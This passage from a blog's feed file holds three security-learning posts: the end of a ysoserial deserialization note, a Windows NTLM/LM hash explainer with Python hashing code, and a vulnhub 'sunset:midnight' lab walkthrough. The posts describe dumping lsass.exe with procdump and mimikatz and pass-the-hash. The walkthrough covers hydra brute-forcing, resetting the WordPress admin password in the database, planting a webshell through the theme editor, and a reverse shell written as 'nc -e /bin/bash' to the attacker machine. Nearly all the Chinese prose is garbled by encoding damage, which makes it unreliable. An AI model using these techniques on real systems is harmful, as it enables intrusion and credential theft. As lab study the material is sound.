class="line"></span><br><span class="line">ObjectPayload&lt;?&gt; payload = clazz.newInstance();</span><br><span class="line">                <span class="keyword">final</span> Object objBefore = payload.getObject(command);</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">&quot;serializing payload&quot;</span>);</span><br><span class="line"><span class="keyword">byte</span>[] ser = Serializer.serialize(objBefore);</span><br><span class="line">Utils.releasePayload(payload, objBefore);</span><br><span class="line">                <span class="keyword">return</span> ser;</span><br><span class="line">&#125;&#125;);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„<code>callWrapped</code>æ•è·åˆ°è¿™ä¸ªå¼‚å¸¸ï¼Œä»è€ŒæŠ›å‡ºå¦ä¸€ä¸ªå¼‚å¸¸<code>ExecException</code>ï¼Œå¯¼è‡´åˆå§‹åŒ–payloadå¤±è´¥</p><p>æ‰€ä»¥<code>ysoserial</code>é‡‡ç”¨äº†é—´æ¥çš„æ–¹æ³•â€”â€”åœ¨æ„é€ çš„æ—¶å€™ä½¿ç”¨<code>toString</code>æ–¹æ³•ï¼Œè€Œåæ”¹å†™<code>iMethodName</code>ã€‚è€Œ<code>ChainedTransformer</code>åˆ™æ— æ³•ä½¿ç”¨è¿™ä¸ªé—´æ¥æ–¹æ³•ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> JavaWeb </category>
          
          <category> ysoserial </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaWeb </tag>
            
            <tag> ysoserial </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows NTLMåè®®</title>
      <link href="/windows_NTLM.html"/>
      <url>/windows_NTLM.html</url>
      
        <content type="html"><![CDATA[<p>Windowsä¸‹<code>NTLM</code>åè®®çš„ç›¸å…³è®¤çŸ¥</p><p>å­¦æµ·æ— æ¶¯ï¼Œå›å¤´æ˜¯å²¸ã€‚</p><a id="more"></a><p>è¢«å¥½å¤šé¢è¯•å¸ˆå‚…éƒ½é—®åˆ°äº†windowsè®¤è¯ç›¸å…³çš„åè®®</p><p>å¡«å‘ä¹‹è·¯ç¬¬äºŒç¯‡ï¼ˆ</p><h1 id="NTLM"><a href="#NTLM" class="headerlink" title="NTLM"></a>NTLM</h1><h2 id="Windowsæœ¬åœ°è®¤è¯"><a href="#Windowsæœ¬åœ°è®¤è¯" class="headerlink" title="Windowsæœ¬åœ°è®¤è¯"></a>Windowsæœ¬åœ°è®¤è¯</h2><p>åœ¨windowså¯åŠ¨æ—¶ï¼Œä¼šè¦æ±‚è¾“å…¥ç”¨æˆ·çš„å¯†ç </p><p>è´¦æˆ·Aè¾“å…¥çš„å¯†ç ä¼šå’Œ<code>%systemroot%\system32\config\sam</code>æ–‡ä»¶ä¸­å­˜å‚¨çš„å¯†ç è¿›è¡Œæ¯”è¾ƒ</p><p>å½“ç„¶ä¸ºäº†å®‰å…¨æ€§ï¼Œsamæ–‡ä»¶å­˜æ”¾çš„è‚¯å®šä¸æ˜¯æ˜æ–‡å¯†ç ï¼Œè€Œæ˜¯å¯†ç çš„hashå€¼ï¼Œå³<code>A_password_hash</code></p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201209201614581.png" alt="image-20201209201614581"></p><h3 id="HTLM-hash"><a href="#HTLM-hash" class="headerlink" title="HTLM hash"></a>HTLM hash</h3><p>è¿™ä¸ª<code>A_password_hash</code>è¢«ç§°ä¹‹ä¸º<code>NTLM hash</code>ï¼Œå…¶ä¸­<code>HTLM</code>æ˜¯ä¸€ç§ç½‘ç»œè®¤è¯åè®®ï¼Œæ˜¯ä»¥<code>NTLM hash</code>ä¸ºåŸºç¡€çš„è®¤è¯åè®®ã€‚</p><p>é‚£ä¹ˆè¿™ä¸ª<code>NTLM hash</code>æ˜¯å¦‚ä½•ç”Ÿæˆçš„å‘¢</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin -&gt; hex(16è¿›åˆ¶ç¼–ç ) &#x3D; 61646d696e</span><br><span class="line">61646d696e -&gt; Unicode &#x3D; 610064006d0069006e00</span><br><span class="line">610064006d0069006e00 -&gt; MD4 &#x3D; 209c6174da490caeb422f3fa5a7ae634</span><br></pre></td></tr></table></figure><blockquote><p>  ä¸Šé¢çš„æµç¨‹æ¥è‡ª</p><p>  <a href="https://payloads.online/archivers/2018-11-30/1">https://payloads.online/archivers/2018-11-30/1</a></p></blockquote><h4 id="æµ‹è¯•NTLM-hash"><a href="#æµ‹è¯•NTLM-hash" class="headerlink" title="æµ‹è¯•NTLM hash"></a>æµ‹è¯•NTLM hash</h4><p>è‡ªå·±ç¼–å†™äº†ä¸€ä¸ªä»£ç æ¥æµ‹è¯•ä¸€ä¸‹hashç»“æœ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä¸‹é¢è¿™Windows.md4 æ˜¯è‡ªå·±å®ç°çš„ä¸€ä¸ªmd4åŠ å¯†çš„æ–¹æ³•</span></span><br><span class="line"><span class="keyword">from</span> Windows.md4 <span class="keyword">import</span> MD4</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NTLM_hash</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, password=<span class="literal">None</span></span>):</span></span><br><span class="line">        self.password = password</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set_password</span>(<span class="params">self, password</span>):</span></span><br><span class="line">        self.password = password</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.hexdigest()</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">hexdigest</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># utf-16 ç¼–ç å®Œæœ€å‰é¢æœ‰ FE FF è¡¨ç¤ºUTF-16</span></span><br><span class="line">        tmp_byte = self.password.encode(<span class="string">&#x27;utf-16&#x27;</span>)[<span class="number">2</span>:]</span><br><span class="line">        <span class="keyword">return</span> MD4(tmp_byte).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    ntlm = NTLM_hash(<span class="string">&#x27;hongrisec@2020&#x27;</span>)</span><br><span class="line">    print(<span class="string">&quot;hongrisec@2020 ==&gt; &quot;</span>, ntlm)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201209212756243.png" alt="image-20201209212756243"></p><p>åˆ°windowsä¸Šé¢ä½¿ç”¨<code>mimikatz</code>æŸ¥çœ‹ä¸€ä¸‹<code>sekurlsa::logonpasswords</code></p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201209212942221.png" alt="image-20201209212942221"></p><p>ç»“æœä¸€è‡´</p><h3 id="æœ¬åœ°è®¤è¯æµç¨‹"><a href="#æœ¬åœ°è®¤è¯æµç¨‹" class="headerlink" title="æœ¬åœ°è®¤è¯æµç¨‹"></a>æœ¬åœ°è®¤è¯æµç¨‹</h3><p>å½“ç”¨æˆ·ç™»å½•æ—¶ï¼Œè°ƒç”¨<code>winlogon.exe</code>ï¼ˆå³ç™»å½•ç¨‹åºï¼‰ï¼Œç­‰å¾…ç”¨æˆ·è¾“å…¥å¯†ç ï¼Œæ¥æ”¶åˆ°è¾“å…¥ä¹‹åæŠŠå¯†ç å°±ç»™<code>lsass.exe</code>è¿›ç¨‹ï¼Œè¿™ä¸ªè¿›ç¨‹ä¼šå­˜æ”¾ä¸€ä»½æ˜æ–‡å¯†ç ï¼Œå¹¶ä¸”å°†æ˜æ–‡å¯†ç ä½¿ç”¨ä¸Šé¢çš„æ­¥éª¤è½¬æ¢æˆ<code>NTLM hash</code>ä¸<code>SAM</code>æ•°æ®åº“æ¯”è¾ƒ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winlogon.exe &#x3D;&#x3D;&gt; æ¥æ”¶ç”¨æˆ·è¾“å…¥çš„å¯†ç  &#x3D;&#x3D;&gt; lsass.exe &#x3D;&#x3D;&gt; (è®¤è¯)</span><br></pre></td></tr></table></figure><p>æ—¢ç„¶<code>lsass.exe</code>å­˜æ”¾çš„æ˜¯æ˜æ–‡çš„å¯†ç ï¼Œé‚£ä¹ˆå°±æ˜¯ä¸å®‰å…¨çš„</p><p><code>mimikatz</code>å·¥å…·æä¾›äº†ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ä»<code>lsass.exe</code>çš„å†…å­˜ä¸­è¯»å–å¯†ç ï¼Œæ‰€ä»¥å¯ä»¥å…ˆå¯¹<code>lsass.exe</code>è¿›ç¨‹ä½¿ç”¨<code>procdump</code>(å¾®è½¯å®˜æ–¹æä¾›çš„è½¯ä»¶ï¼Œç”¨äºè½¬å‚¨è¿›ç¨‹çš„å†…å­˜)ï¼Œç„¶åä¸‹è½½å¯¼å‡ºçš„æ–‡ä»¶ï¼Œä½¿ç”¨<code>mimikatz</code>è§£å¯†ï¼Œå¾—åˆ°ç®¡ç†å‘˜ï¼ˆå·²ç»ç™»å½•çš„ï¼‰çš„å¯†ç </p><h3 id="LM-hash"><a href="#LM-hash" class="headerlink" title="LM hash"></a>LM hash</h3><p>NTLMåè®®çš„å‰èº«æ˜¯LMåè®®</p><p>ä¸¤è€…çš„åŠ å¯†ç®—æ³•ä¸åŒ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">å°†æ‰€æœ‰å°å†™å­—æ¯è½¬æ¢ä¸ºå¤§å†™å­—æ¯</span><br><span class="line">â€¢ &gt;123ABC &#x2F;&#x2F; æœªè¾¾åˆ°7ä¸ªå­—ç¬¦</span><br><span class="line">â€¢ å°†å¯†ç è½¬åŒ–ä¸º16è¿›åˆ¶ï¼Œåˆ†ä¸¤ç»„ï¼Œå¡«å……ä¸º14ä¸ªå­—ç¬¦,ç©ºä½™ä½ä½¿ç”¨0x00å­—ç¬¦å¡«è¡¥</span><br><span class="line">â€¢ &gt;31323341424300000000000000</span><br><span class="line">â€¢ å°†å¯†ç åˆ†å‰²ä¸ºä¸¤ç»„7ä¸ªå­—èŠ‚çš„å—</span><br><span class="line">â€¢ &gt;31323341424300 00000000000000 &#x2F;&#x2F; 16è¿›åˆ¶</span><br><span class="line">â€¢ å°†æ¯ç»„è½¬åŒ–ä¸ºæ¯”ç‰¹æµï¼Œä¸è¶³56Bitåˆ™åœ¨å·¦è¾¹åŠ 0</span><br><span class="line">â€¢ &gt;31323341424300 -&gt;(è½¬æ¢ä¸ºäºŒè¿›åˆ¶) 110001001100100011001101000001010000100100001100000000-&gt; (è¡¥ è¶³56Bit) 00110001001100100011001101000001010000100100001100000000</span><br><span class="line">â€¢ å°†æ¯”ç‰¹æµæŒ‰ç…§7æ¯”ç‰¹ä¸€ç»„ï¼Œåˆ†å‡º8ç»„ï¼Œæœ«å°¾åŠ 0</span><br><span class="line"></span><br><span class="line">ç”±äºåè€…éƒ½ä¸º0ï¼Œç»“æœå¯æƒ³è€ŒçŸ¥ï¼Œé‚£å°±éƒ½æ˜¯0;</span><br><span class="line">â€¢ å°†æ¯ç»„æ¯”ç‰¹æµè½¬æ¢ä¸º16è¿›åˆ¶ä½œä¸ºè¢«åŠ å¯†çš„å€¼ï¼Œä½¿ç”¨DESåŠ å¯†ï¼Œå­—ç¬¦ä¸² â€œKGS!@#$%â€ä¸ºKey(0x4B47532140232425)ï¼Œå¾—åˆ°8ä¸ªç»“æœ ï¼Œæ¯ä¸ª ç»“æœè½¬æ¢ä¸º16è¿›åˆ¶ã€‚</span><br><span class="line">â€¢ -&gt; 00110000100110001000110001101000000101000001001000001100 00000000</span><br><span class="line">â€¢ -&gt;30988C6814120C00 -&gt; DES(30988C6814120C00) -&gt; 48-D7-EB-91- 2F-5E-69-7C</span><br><span class="line">â€¢ ç”±äºæˆ‘ä»¬çš„å¯†ç ä¸è¶…è¿‡7å­—èŠ‚ï¼Œæ‰€ä»¥åé¢çš„ä¸€åŠæ˜¯å›ºå®šçš„:</span><br><span class="line">â€¢ AA-D3-B4-35-B5-14-04-EE</span><br><span class="line">â€¢ è¿æ¥ä¸¤ä¸ªDESåŠ å¯†å­—ç¬¦ä¸²ã€‚è¿™æ˜¯LMå“ˆå¸Œã€‚</span><br><span class="line">â€¢ 48-D7-EB-91-2F-5E-69-7C-AA-D3-B4-35-B5-14-04-EE</span><br></pre></td></tr></table></figure><ul><li><p>å¦‚æœå¯†ç é•¿åº¦å°äº7ä¸ªå­—ç¬¦ï¼Œé‚£ä¹ˆç¬¬äºŒéƒ¨åˆ†çš„ç»“æœçš„å€¼å°†æ˜¯å›ºå®šçš„</p><p>  <code>AAD3B435B51404EE</code></p></li><li><p>  å¯ä»¥é€šè¿‡è§‚å¯Ÿæœ€åè¿™ä¸€éƒ¨åˆ†ï¼Œåˆ¤æ–­å¯†ç çš„é•¿åº¦æ˜¯å¦ä½äº7ä¸ªå­—ç¬¦</p></li></ul><h4 id="æµ‹è¯•-LM-hash"><a href="#æµ‹è¯•-LM-hash" class="headerlink" title="æµ‹è¯• LM hash"></a>æµ‹è¯• LM hash</h4><p>è‡ªå·±è¯•ç€å†™äº†ä¸€ä¸ªå°ç¨‹åº</p><ul><li>  keyä¸ºåˆ†ç»„åçš„ç»“æœ</li><li>  åŠ å¯†çš„å†…å®¹ä¸º<code>KGS!@#$%</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LM_hash</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, password=<span class="literal">None</span></span>):</span></span><br><span class="line">        self.password = password</span><br><span class="line">        self.key = <span class="string">b&#x27;KGS!@#$%&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.password + <span class="string">&quot; ==&gt; &quot;</span> + self.hexdigest()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">hexdigest</span>(<span class="params">self</span>):</span></span><br><span class="line">        password = self.password.upper()</span><br><span class="line">        password = password.encode().ljust(<span class="number">14</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">        password = <span class="built_in">hex</span>(bytes_to_long(password))[<span class="number">2</span>:]</span><br><span class="line">        tmp_list = [<span class="string">&#x27;0x&#x27;</span> + password[:<span class="number">14</span>], <span class="string">&#x27;0x&#x27;</span> + password[<span class="number">14</span>:]]</span><br><span class="line">        ans = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">            tmp_key = []</span><br><span class="line">            key = <span class="built_in">int</span>(tmp_list[i], <span class="number">16</span>)</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">                tmp_key.append(<span class="built_in">hex</span>((key &amp; <span class="number">0x7f</span>) * <span class="number">0x2</span>)[<span class="number">2</span>:])</span><br><span class="line">                key = key &gt;&gt; <span class="number">7</span></span><br><span class="line"></span><br><span class="line">            tmp_key.reverse()</span><br><span class="line">            key = <span class="string">&quot;0x&quot;</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> tmp_key:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(j) &lt; <span class="number">2</span>:</span><br><span class="line">                    j = <span class="string">&#x27;0&#x27;</span> + j</span><br><span class="line">                key += j</span><br><span class="line">            value = long_to_bytes(<span class="built_in">int</span>(key, <span class="number">16</span>))</span><br><span class="line">            val = <span class="built_in">len</span>(value) % <span class="number">8</span></span><br><span class="line">            <span class="keyword">if</span> val != <span class="number">0</span>:</span><br><span class="line">                value += <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">8</span> - val)</span><br><span class="line">            des = DES.new(key=value, mode=DES.MODE_ECB)</span><br><span class="line">            ans += des.encrypt(self.key).<span class="built_in">hex</span>()</span><br><span class="line">        <span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    print(LM_hash(<span class="string">&#x27;hongrisec@2020&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>åŠ å¯†ä¹‹åçš„ç»“æœä¸º</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201210103024944.png" alt="image-20201210103024944"></p><p>ä½¿ç”¨<code>mimikatz</code>åœ¨Windowsä¸­æŸ¥çœ‹<code>LM hash</code></p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201210103058006.png" alt="image-20201210103058006"></p><h2 id="Windowsç½‘ç»œè®¤è¯"><a href="#Windowsç½‘ç»œè®¤è¯" class="headerlink" title="Windowsç½‘ç»œè®¤è¯"></a>Windowsç½‘ç»œè®¤è¯</h2><h3 id="NTLM-åè®®"><a href="#NTLM-åè®®" class="headerlink" title="NTLM åè®®"></a>NTLM åè®®</h3><p>NTLMåè®®çš„è®¤è¯è¿‡ç¨‹åˆ†ä¸ºä¸‰æ­¥</p><ul><li>  åå•†</li><li>  è´¨è¯¢</li><li>  éªŒè¯</li></ul><h4 id="åå•†"><a href="#åå•†" class="headerlink" title="åå•†"></a>åå•†</h4><p>ä¸»è¦ç”¨äºåŒæ–¹ç¡®è®¤åè®®ç‰ˆæœ¬</p><h4 id="è´¨è¯¢"><a href="#è´¨è¯¢" class="headerlink" title="è´¨è¯¢"></a>è´¨è¯¢</h4><p>åŸºäº <strong>æŒ‘æˆ˜(chalenge)/ç›¸åº”(response)</strong> è®¤è¯æœºåˆ¶</p><p>å®Œæ•´è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><ol><li><p> <code>client</code>è¯·æ±‚<code>server</code>çš„æŸèµ„æºï¼Œå°†<code>usernameA</code>å‘é€</p></li><li><p><code>server</code>æ¥æ”¶åˆ°<code>client</code>å‘é€çš„<code>usernameA</code>ï¼Œåˆ¤æ–­<code>usernameA</code>æ˜¯å¦åœ¨æœ¬åœ°è´¦æˆ·åˆ—è¡¨<code>share_user</code>é‡Œ</p><ul><li><p>  å¦‚æœæ²¡æœ‰ï¼Œè®¤è¯å¤±è´¥</p></li><li><p>å¦‚æœæœ‰ï¼Œç”Ÿæˆä¸€ä¸ª<code>Chalenge</code>ï¼ˆä¸º16ä½çš„éšæœºæ•°ï¼‰ï¼Œå¹¶ä¸”ä½¿ç”¨<code>usernameA</code>çš„<code>NTLM hash</code>åŠ å¯†<code>Chalenge</code>å¾—åˆ°ä¸€ä¸ªå¯†æ–‡<code>Chalenge_encry</code>ï¼Œå¹¶ä¸”å°†<code>Chalenge</code>å‘é€ç»™<code>client</code></p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201210110356264.png" alt="image-20201210110356264"></p></li></ul></li><li><p> <code>client</code>æ¥æ”¶åˆ°<code>Chalenge</code>ï¼Œä½¿ç”¨<code>usernameA</code>çš„<code>NTLM hash</code>åŠ å¯†å¾—åˆ°<code>Chalenge_encry</code>å¹¶ä¸”å°†<code>Chalenge_encry</code>å‘é€ç»™<code>server</code></p></li><li><p><code>server</code>æ¯”è¾ƒ<code>client</code>å‘é€çš„<code>Chalenge_encry</code>å’Œè‡ªå·±çš„ï¼Œç›¸ç­‰ï¼Œåˆ™è®¤è¯é€šè¿‡</p><p> <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201210110408447.png" alt="image-20201210110408447"></p></li></ol><ul><li>  <code>Chalenge</code>ä¸º<code>server</code>äº§ç”Ÿçš„ä¸€ä¸ªéšæœºæ•°ï¼Œæ¯æ¬¡éƒ½ä¸åŒ</li></ul><h4 id="éªŒè¯"><a href="#éªŒè¯" class="headerlink" title="éªŒè¯"></a>éªŒè¯</h4><p>è´¨è¯¢å®Œæˆä¹‹åï¼ŒéªŒè¯ç»“æœ</p><h3 id="NTLM-v2åè®®"><a href="#NTLM-v2åè®®" class="headerlink" title="NTLM v2åè®®"></a>NTLM v2åè®®</h3><p>NTLM v1ä¸NTLM v2æœ€æ˜¾è‘—çš„åŒºåˆ«å°±æ˜¯Challengeä¸åŠ å¯†ç®—æ³•ä¸åŒ</p><ul><li>  <strong>Challage</strong>:NTLM v1çš„Challengeæœ‰<strong>8ä½</strong>ï¼ŒNTLM v2çš„Challengeä¸º<strong>16ä½</strong>ã€‚</li><li>  <strong>Net-NTLM Hash</strong>:NTLM v1çš„ä¸»è¦åŠ å¯†ç®—æ³•æ˜¯<strong>DES</strong>ï¼ŒNTLM v2çš„ä¸»è¦åŠ å¯†ç®—æ³•æ˜¯<strong>HMAC-MD5</strong>ã€‚</li></ul><h3 id="pass-the-hash"><a href="#pass-the-hash" class="headerlink" title="pass the hash"></a>pass the hash</h3><p>åœ¨ä¸Šè¿°è®¤è¯è¿‡ç¨‹ä¸­ï¼Œå¦‚æœæœ¬åœ°æœ‰</p><ul><li>  åœ¨<code>share_user</code>ä¸­çš„ä¸€ä¸ªç”¨æˆ·å</li><li>  ç”¨æˆ·åçš„<code>HTLM hash</code></li></ul><p>é‚£ä¹ˆå°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªç”¨æˆ·åå’Œä»–çš„<code>hash</code>è¿›è¡Œè®¤è¯ï¼Œè€Œä¸éœ€è¦è¾“å…¥å¯†ç </p>]]></content>
      
      
      <categories>
          
          <category> intranet - windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> kerberos </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub sunset:midnighté¶æœº</title>
      <link href="/sunset-midnight.html"/>
      <url>/sunset-midnight.html</url>
      
        <content type="html"><![CDATA[<p>vulnhubé‡Œçš„ sunset-midnight é¶æœº</p><p>ç®€å•éš¾åº¦</p><a id="more"></a><h1 id="sunset-midnight"><a href="#sunset-midnight" class="headerlink" title="sunset:midnight"></a>sunset:midnight</h1><h2 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h2><ul><li>  é¶æœºï¼š<code>192.168.2.4</code></li><li>  æ”»å‡»æœºï¼š<code>192.168.2.3</code></li></ul><h2 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h2><p>ç›®æ ‡å¼€æ”¾<code>22 80 3306</code>ç«¯å£</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201208201123005.png" alt="image-20201208201123005"></p><h2 id="web-attack"><a href="#web-attack" class="headerlink" title="web_attack"></a>web_attack</h2><p>ä¸Šæ¥å…ˆå„ç§çˆ†ç ´å¯†ç </p><p>ç”¨<code>hydra</code>çˆ†ç ´<code>ssh</code>å’Œ<code>sql</code></p><p>åŒæ—¶è®¿é—®webï¼Œçœ‹åˆ°æ˜¯ä¸€ä¸ª<code>wordpress</code></p><h3 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a>wpscan</h3><p>ç”¨<code>wpscan</code>æ‰«æä¸€ä¸‹ï¼Œæœ‰æ²¡æœ‰ç°æˆçš„æ´</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201208201359830.png" alt="image-20201208201359830"></p><p>ç»“æœæ˜¯æ²¡æœ‰ï¼Œæ‰«æå‡ºæ¥ä¸€ä¸ªç”¨æˆ·æ˜¯<code>admin</code></p><h3 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h3><p>æ­¤æ—¶<code>hydra</code>çˆ†ç ´çš„ç»“æœå‡ºæ¥äº†</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201208201509729.png" alt="image-20201208201509729"></p><p>è¿æ¥ä¸Šå»ï¼Œè¯•å›¾å†™webshellï¼Œçœ‹ä¸€ä¸‹å†™æ–‡ä»¶æƒé™</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201208201554509.png" alt="image-20201208201554509"></p><p>å‘ç°æ²¡æœ‰é™åˆ¶å†™çš„ç›®å½•ï¼Œè¯•å›¾å†™å…¥<code>/var/www/html/info.php</code></p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201208201651841.png" alt="image-20201208201651841"></p><p>æ²¡æœ‰å†™è¿™ä¸ªç›®å½•çš„æƒé™â€¦..</p><p>åˆæƒ³åˆ°è¿™æ˜¯<code>wordpress</code>ç«™ç‚¹ï¼Œå¯†ç æ˜¯å­˜åœ¨æ•°æ®åº“é‡Œçš„ï¼Œåªè¦èƒ½å¤Ÿä¿®æ”¹æ•°æ®åº“ï¼Œé‚£å°±èƒ½è¿›åˆ°åå°</p><p>å…¶ä¸­stdoutæ•°æ®åº“æ˜¯æˆ‘è‡ªå·±åœ¨æµ‹è¯•çš„æ—¶å€™æ–°å»ºçš„</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201208201758315.png" alt="image-20201208201758315"></p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201208201836930.png" alt="image-20201208201836930"></p><p>å¯†ç å°±æ”¾åœ¨<code>wp_users</code>è¡¨ä¸­</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201208201916092.png" alt="image-20201208201916092"></p><p>ç”¨<code>update</code>è¯­å¥ä¿®æ”¹<code>admin</code>çš„å¯†ç å³å¯ï¼ˆå¯†ç è®°å¾—ç”¨md5ï¼‰</p><p>äºæ˜¯å¯ä»¥è¿›å…¥<code>wordpress</code>åå°</p><h3 id="wordpress"><a href="#wordpress" class="headerlink" title="wordpress"></a>wordpress</h3><p>æ—¢ç„¶è¿›äº†åå°ï¼Œé‚£å°±å¥½åŠå¤šäº†</p><p>ç¼–è¾‘<code>Appearance -&gt; Theme Editor</code></p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201208202100504.png" alt="image-20201208202100504"></p><p>å¯ä»¥ç›´æ¥ä¿®æ”¹phpæºç </p><p>ä½†æ˜¯æœ‰ä¸ªé—®é¢˜ï¼Œä¸èƒ½ç›´æ¥ä¿®æ”¹æ­£åœ¨ä½¿ç”¨çš„ä¸»é¢˜çš„phpæºç </p><p>å¦åˆ™ä¼šæŠ¥é”™</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201208202204736.png" alt="image-20201208202204736"></p><p>æ—¢ç„¶å¦‚æ­¤å°±æ”¹æ‰åˆ«çš„ä¸»é¢˜çš„ä»£ç </p><p>ä¿®æ”¹å®Œä¹‹ååˆ‡æ¢ä¸»é¢˜è¿‡å»</p><p>å¾—åˆ°ä¸€ä¸ªwebshell</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201208202247739.png" alt="image-20201208202247739"></p><p>è¿æ¥ä¸€ä¸ªåå¼¹shell <code>nc -e /bin/bash 192.168.2.3 